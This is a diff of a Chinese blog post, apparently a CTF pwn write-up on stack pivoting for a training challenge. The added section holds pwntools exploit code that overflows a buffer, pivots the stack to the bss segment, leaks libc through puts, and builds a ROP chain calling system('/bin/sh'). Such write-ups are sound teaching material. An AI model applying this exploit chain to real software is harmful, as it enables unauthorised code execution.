@@ -27,7 +27,7 @@
 <meta property="og:description" content="被冬训题stack-pivot折磨的死去活来，最后真相令人哭笑不得  stack-pivot背景">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-11-17T16:00:00.000Z">
-<meta property="article:modified_time" content="2025-11-18T11:17:10.953Z">
+<meta property="article:modified_time" content="2025-11-20T13:02:42.196Z">
 <meta property="article:author" content="qsc">
 <meta property="article:tag" content="CTF">
 <meta property="article:tag" content="pwn">
@@ -254,9 +254,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
-      
 
-      <time title="创建时间：2025-11-18 00:00:00 / 修改时间：19:17:10" itemprop="dateCreated datePublished" datetime="2025-11-18T00:00:00+08:00">2025-11-18</time>
+      <time title="创建时间：2025-11-18 00:00:00" itemprop="dateCreated datePublished" datetime="2025-11-18T00:00:00+08:00">2025-11-18</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2025-11-20 21:02:42" itemprop="dateModified" datetime="2025-11-20T21:02:42+08:00">2025-11-20</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -282,14 +288,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>309</span>
+      <span>1.2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>2 分钟</span>
     </span>
 </div>
 
@@ -315,7 +321,13 @@ fake rbp
 addr to next gadget
 </code></pre>
 <p>就可以劫持栈指针，一般劫持到bss段后的位置：<strong>注意要离bss段远一点！！！</strong></p>
-<h2 id="实践（以冬训题stack-pivot为例）"><a href="#实践（以冬训题stack-pivot为例）" class="headerlink" title="实践（以冬训题stack-pivot为例）"></a>实践（以冬训题stack-pivot为例）</h2>
+<h2 id="实践（以冬训题stack-pivot为例）"><a href="#实践（以冬训题stack-pivot为例）" class="headerlink" title="实践（以冬训题stack-pivot为例）"></a>实践（以冬训题stack-pivot为例）</h2><p>  bss5&#x3D;0x601200+0x500<br>  payload&#x3D;pwn.flat([b’a’*0x30,p64(bss5),p64(read)])<br>  sh.sendafter(“overflow?\n”,payload)<br>  payload&#x3D;pwn.flat([b’a’*0x30,p64(bss5+0x30),p64(read)])<br>  sh.send(payload)<br>首先通过两次pop|ret，将指针劫持到bss段上</p>
+<p>  puts_got&#x3D;elf.got[‘puts’]<br>  puts_plt&#x3D;elf.plt[‘puts’]<br>  payload&#x3D; pwn.flat([p64(bss5+0x40),p64(pop_rdi),p64(puts_got),p64(puts_plt),p64(main)])<br>  sh.send(payload)<br>  libc.address &#x3D; u64(sh.recv(6).ljust(8,b’\x00’))-0x80e50<br>  binsh &#x3D; next(libc.search(b’&#x2F;bin&#x2F;sh’))<br>  system &#x3D; libc.sym[‘system’]<br>  exit_addr &#x3D; libc.sym[‘exit’]<br>再在bss段上泄露libc基址</p>
+<p>  bss6&#x3D;0x601200+0x600<br>  payload &#x3D; pwn.flat([b’a’*0x30,p64(bss6+0x100), p64(read)])<br>  sh.sendafter(b’overflow?\n’, payload)<br>  payload&#x3D;pwn.flat([b’a’*0x30,p64(bss6+0x130),p64(read)])<br>  sh.send(payload)<br>  rop_chain &#x3D;pwn.flat([p64(ret),p64(pop_rdi),p64(binsh),p64(ret),p64(system)])<br>  sh.send(rop_chain)<br>再次迁移，执行system</p>
+<ul>
+<li>注意尽量往bss后段迁移，太近可能导致失败</li>
+</ul>
+
     </div>
 
     
@@ -367,13 +379,13 @@ addr to next gadget
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    total words&asymp;<span title="站点总字数">13k</span>
+    total words&asymp;<span title="站点总字数">14k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">23 分钟</span>
+    <span title="站点阅读时长">25 分钟</span>
   </span>
 </div>
 <div class="busuanzi-count">
